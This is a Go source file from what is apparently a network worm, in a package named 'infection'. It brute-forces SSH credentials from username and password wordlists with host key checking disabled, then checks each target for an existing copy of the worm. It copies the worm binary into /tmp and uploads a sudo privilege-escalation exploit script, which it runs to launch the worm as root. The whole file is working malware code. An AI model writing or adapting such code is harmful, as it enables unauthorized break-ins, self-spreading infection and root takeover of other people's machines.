package infection

import (
	"golang.org/x/crypto/ssh"
	"log"
	"time"
	"bytes"
	"strconv"
	"math/rand"
	"os"
	"bufio"
	"fmt"
)

var (
	username = "ubuntu"
	password = "ubuntu"
	worm_dir = "/tmp"
	sudo_exploit_filename = "exploit_nss.py"
	worm_filename = "worm" + strconv.Itoa(rand.Intn(3))
	timeout = time.Minute
)

func OpenSSHConnection(ip string) (*ssh.Client, *ssh.Session) {
	var c *ssh.Client
	var s *ssh.Session
	//var err error
	var miss bool
	var goNext bool

	users,err_users := os.Open("users.txt")

	if err_users != nil {
		log.Fatal(err_users)
	}
	defer users.Close()

	user_scanner := bufio.NewScanner(users)

	for user_scanner.Scan() {
		username := user_scanner.Text()
		pwds,err_pwds := os.Open("passwords.txt")
		if err_pwds != nil {
			log.Fatal(err_pwds)
		}
		defer pwds.Close()
		pwd_scanner := bufio.NewScanner(pwds)
		for pwd_scanner.Scan(){
			password := pwd_scanner.Text()
			miss = false
			goNext = false

			fmt.Println("Trying new pair:", "username:", username, "password:", password, "on ip:", ip)
			config := &ssh.ClientConfig{
				User: username,
				Auth: []ssh.AuthMethod{
					ssh.Password(password),
				},
				HostKeyCallback: ssh.InsecureIgnoreHostKey(),
				Timeout: timeout,
			}

			client, err := ssh.Dial("tcp",ip,config)
			if err != nil && !goNext {
				log.Println("Failed to dial: ", err)
				miss = true
				goNext = true
			}

			if !goNext {
				s, err = client.NewSession()
				if err != nil {
					log.Println("Failed to create session: ", err)
					miss = true
					goNext = true
				}
			}

			if !miss {
				return c,s
			}
		}



		if err_pwds := pwd_scanner.Err(); err_pwds != nil {
		  log.Fatal(err_pwds)
		}
	}
	log.Println("Not a single hit in dictionary")
	if err_users := user_scanner.Err(); err_users != nil {
	  log.Fatal(err_users)
	}

	return c,s
}


func SshCheckInfection(ip string) bool {
	client, session := OpenSSHConnection(ip)
	if client != nil {
		defer client.Close()
	}
	defer session.Close()

	out, _ := session.CombinedOutput("if [ -f \"" + worm_dir + "/" + worm_filename + "\" ]; then echo \"hola\"; fi;")
	log.Printf("Command output: %q", out)
	if len(out) != 0 {
		log.Printf("Command output: %q", out)
		return true
	}

	return false
}

func SshInfect(ip string) string {
	client, session := OpenSSHConnection(ip)
	if client != nil {
		defer client.Close()
	}
	defer session.Close()

	var worm []byte
	worm = GetFile(worm_dir + "/" + worm_filename)
	session.Stdin = bytes.NewReader(worm)
	session.CombinedOutput("cat > " + worm_dir + "/" + worm_filename)

	return "Finished infecting"
}


func SshExploit(ip string) string {
	client, session := OpenSSHConnection(ip)
	if client != nil {
		defer client.Close()
	}
	defer session.Close()

	var exploit []byte
	exploit = GetFile(worm_dir + "/" + sudo_exploit_filename)
	session.Stdin = bytes.NewReader(exploit)
	session.CombinedOutput("cat > " + worm_dir + "/" + sudo_exploit_filename + " && "  +
					 "cd " + worm_dir + " && " +
				         "chmod 0700 " + sudo_exploit_filename + " && " +
				         "echo '/bin/sh -c /tmp/worm' | ./" + sudo_exploit_filename)

	return "Finished exploiting"
}
